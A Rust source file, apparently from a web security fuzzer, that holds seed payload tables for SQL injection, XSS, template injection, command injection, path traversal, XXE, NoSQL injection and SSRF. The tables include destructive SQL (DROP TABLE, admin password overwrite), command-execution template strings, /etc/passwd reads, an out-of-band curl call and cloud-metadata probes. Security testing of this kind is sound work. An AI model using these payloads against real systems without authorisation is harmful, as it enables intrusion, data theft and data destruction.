//! Classic payload tables — known high-probability probes for each vuln class.
//!
//! These are the "sweep the table first" seeds. The engine mutates from them,
//! exploring the neighborhood of each proven payload rather than starting blind.

/// Classic SQL injection probes — ordered roughly by detection power.
///
/// Tier 1: error-triggering (fast, loud, confirmed)
/// Tier 2: boolean/blind (slower, needs signal analysis)
/// Tier 3: UNION-based (needs column count discovery)
/// Tier 4: time-based (slow but reliable when all else fails)
pub const SQLI_PAYLOADS: &[&str] = &[
    // ── Tier 1: error-based ─────────────────────────────────────────────
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' OR '1'='1'--",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1",
    "') OR 1=1--",
    "\") OR 1=1--",
    "admin'--",
    "admin' #",
    "' AND '1'='1",
    "\" AND \"1\"=\"1",
    "' AND 1=1--",
    "' AND '1'='1'--",
    "1' AND '1'='1",
    "1\" AND \"1\"=\"1",
    "' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    // ── Tier 2: boolean/blind ───────────────────────────────────────────
    "' AND '1'='2",
    "\" AND \"1\"=\"2",
    "' AND 1=2--",
    "' AND 'a'='b",
    "1' AND '1'='2",
    // ── Tier 3: UNION-based ─────────────────────────────────────────────
    "' UNION SELECT NULL--",
    "\" UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "') UNION SELECT NULL--",
    "1' UNION SELECT NULL--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT @@version--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    // ── Tier 4: time-based ──────────────────────────────────────────────
    "' OR IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "' OR SLEEP(5)='",
    // ── Stacked queries ─────────────────────────────────────────────────
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','pass')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    // ── Encoded variants ────────────────────────────────────────────────
    "%27%20OR%201%3D1--",
    "%22%20OR%201%3D1--",
    "%%27%%20OR%%201%%3D1--",
];

/// Classic XSS probes — ordered by reflection context.
pub const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<details open ontoggle=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<%= alert(1) %>",
    "';alert(1)//",
    "\";alert(1)//",
    "</script><script>alert(1)</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
];

/// Classic SSTI / template injection probes.
pub const SSTI_PAYLOADS: &[&str] = &[
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${7*'7'}",
    "{{config}}",
    "${config}",
    "{{self}}",
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{config.items()}}",
    "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__.os.popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    "<%= system('id') %>",
    "<%= IO.popen('id').readlines() %>",
];

/// Classic command injection probes.
pub const CMD_PAYLOADS: &[&str] = &[
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "&&id",
    "||id",
    "%0aid",
    "%0d%0aid",
    ";sleep 5",
    "|sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    ";ping -c 5 127.0.0.1",
    "|ping -c 5 127.0.0.1",
    ";curl http://oast.example.com",
    "|curl http://oast.example.com",
    "';id;'",
    "\";id;\"",
    "';id;#",
    "\";id;#",
    "| cat /etc/passwd",
    "; cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
];

/// Classic path traversal / LFI probes.
pub const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
];

/// Classic XXE probes.
pub const XXE_PAYLOADS: &[&str] = &[
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://oast.example.com\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://oast.example.com\"> %xxe;]>",
];

/// Classic NoSQL injection probes.
pub const NOSQLI_PAYLOADS: &[&str] = &[
    "{\"$gt\": \"\"}",
    "{\"$ne\": null}",
    "{\"$where\": \"sleep(5000)\"}",
    "{\"$regex\": \".*\"}",
    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
    "username[$ne]=&password[$ne]=",
    "{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}",
    "{\"$or\": [{}, {}]}",
    "true, $or: [ {}, { 'a':'a' } ]",
    "0;return true",
    "1;return true",
    "';return true;var foo='",
    "\";return true;var foo=\"",
];

/// Classic SSRF probes.
pub const SSRF_PAYLOADS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080",
    "http://localhost:8080",
    "http://[::1]:8080",
    "http://0.0.0.0:8080",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
];
